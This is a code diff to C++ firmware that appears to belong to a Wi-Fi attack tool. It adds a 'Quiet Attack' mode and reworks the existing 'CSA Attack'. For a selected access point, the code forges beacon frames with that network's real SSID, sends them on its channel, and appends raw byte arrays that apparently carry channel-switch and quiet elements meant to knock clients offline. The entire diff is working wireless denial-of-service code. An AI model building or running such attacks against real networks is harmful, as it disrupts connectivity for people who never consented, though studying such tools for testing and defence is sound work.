@@ -2136,6 +2136,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
     this->startWiFiAttacks(scan_mode, color, text_table1[51]);
   else if (scan_mode == WIFI_ATTACK_CSA)
     this->startWiFiAttacks(scan_mode, color, "CSA Attack");
+  else if (scan_mode == WIFI_ATTACK_QUIET)
+   this->startWiFiAttacks(scan_mode, color, "Quiet Attack");
   else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
     this->startWiFiAttacks(scan_mode, color, text_table1[52]);
   else if (scan_mode == WIFI_ATTACK_FUNNY_BEACON)
@@ -2443,6 +2445,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
   (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
   (currentScanMode == WIFI_ATTACK_CSA) ||
+  (currentScanMode == WIFI_ATTACK_QUIET) ||
   (currentScanMode == WIFI_ATTACK_AUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
@@ -8802,7 +8805,7 @@ void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t 
   }
 }
 
-void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid, bool csa) {
+void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid, int scan_mode) {
   int post_ssid_len = 12;
 
   #ifndef HAS_DUAL_BAND
@@ -8810,7 +8813,7 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
   #else
     set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
   #endif
-  if (csa) {
+  if (scan_mode == WIFI_ATTACK_CSA) {
     post_ssid_len = 18;
     while (set_channel == custom_ssid.channel) {
       #ifndef HAS_DUAL_BAND
@@ -8819,17 +8822,15 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
         set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
       #endif
     }
+  } else if (scan_mode == WIFI_ATTACK_QUIET) {
+    post_ssid_len = 44;
+    set_channel = custom_ssid.channel;
   }
   this->changeChannel(this->set_channel);
   delay(1);  
 
-  //if (custom_ssid.beacon->size() == 0)
-  //  return;
-
-
-  // Randomize SRC MAC
-  // Randomize SRC MAC
-  if (!csa) {
+  if ((scan_mode != WIFI_ATTACK_CSA) &&
+      (scan_mode != WIFI_ATTACK_QUIET)) {
     packet[10] = packet[16] = random(256);
     packet[11] = packet[17] = random(256);
     packet[12] = packet[18] = random(256);
@@ -8850,7 +8851,8 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
 
   int realLen = strlen(ESSID);
   int ssidLen = realLen;
-  if (!csa)
+  if ((scan_mode != WIFI_ATTACK_CSA) &&
+      (scan_mode != WIFI_ATTACK_QUIET))
     ssidLen = random(realLen, 33);
 
   int numSpace = ssidLen - realLen;
@@ -8860,26 +8862,54 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
   for(int i = 0; i < realLen; i++)
     packet[38 + i] = ESSID[i];
 
-  if (!csa) {
+  if ((scan_mode != WIFI_ATTACK_CSA) &&
+      (scan_mode != WIFI_ATTACK_QUIET)) {
     for(int i = 0; i < numSpace; i++)
       packet[38 + realLen + i] = 0x20;
 
     packet[50 + fullLen] = set_channel;
   }
-  
 
-  if (!csa) {
-    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                            0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
+  const uint8_t* post = nullptr;
+  int post_len = 0;
 
-    for(int i = 0; i < post_ssid_len; i++) 
-      packet[38 + fullLen + i] = postSSID[i];
+  static const uint8_t post_base[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x04
+  };
+
+  static const uint8_t post_csa[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x00,
+    0x25, 0x03, 0x01, 0x00, 0x03
+  };
+
+  static const uint8_t post_quiet[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x00, 0x07, 0x06, 0x55, 0x53, 0x20,
+    0x64, 0x0b, 0x14, 0x20, 0x01, 0x00, 0x05, 0x04, 0x00, 0x01,
+    0x00, 0x00, 0x32, 0x04, 0x0c, 0x12, 0x18, 0x60, 0x28, 0x06,
+    0x01, 0x05, 0xff, 0xff, 0x00, 0x64
+  };
+
+  uint8_t temp[64]; // big enough for worst case
+  if (scan_mode == WIFI_ATTACK_CSA) {
+    memcpy(temp, post_csa, sizeof(post_csa));
+    temp[12] = custom_ssid.channel;
+    temp[16] = set_channel;
+    post = temp;
+    post_len = sizeof(post_csa);
+  } else if (scan_mode == WIFI_ATTACK_QUIET) {
+    memcpy(temp, post_quiet, sizeof(post_quiet));
+    temp[12] = custom_ssid.channel;
+    post = temp;
+    post_len = sizeof(post_quiet);
   } else {
-    uint8_t postSSID[18] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                            0x03, 0x01, custom_ssid.channel, 0x25, 0x03, 0x01, set_channel, 0x03 };
-    for(int i = 0; i < post_ssid_len; i++) 
-      packet[38 + fullLen + i] = postSSID[i];
+    post = post_base;
+    post_len = sizeof(post_base);
   }
+
+  memcpy(packet + (38 + fullLen), post, post_len);
 
   packet[34] = custom_ssid.beacon[0];
   packet[35] = custom_ssid.beacon[1];
@@ -12006,10 +12036,11 @@ void WiFiScan::main(uint32_t currentTime)
     }
   }
   else if ((currentScanMode == WIFI_ATTACK_AP_SPAM) ||
-           (currentScanMode == WIFI_ATTACK_CSA)) {
+           (currentScanMode == WIFI_ATTACK_CSA) ||
+           (currentScanMode == WIFI_ATTACK_QUIET)) {
     for (int i = 0; i < access_points->size(); i++) {
       if (access_points->get(i).selected)
-        this->broadcastCustomBeacon(currentTime, access_points->get(i), currentScanMode == WIFI_ATTACK_CSA);
+        this->broadcastCustomBeacon(currentTime, access_points->get(i), currentScanMode);
     }
 
     if (currentTime - initTime >= 1000) {
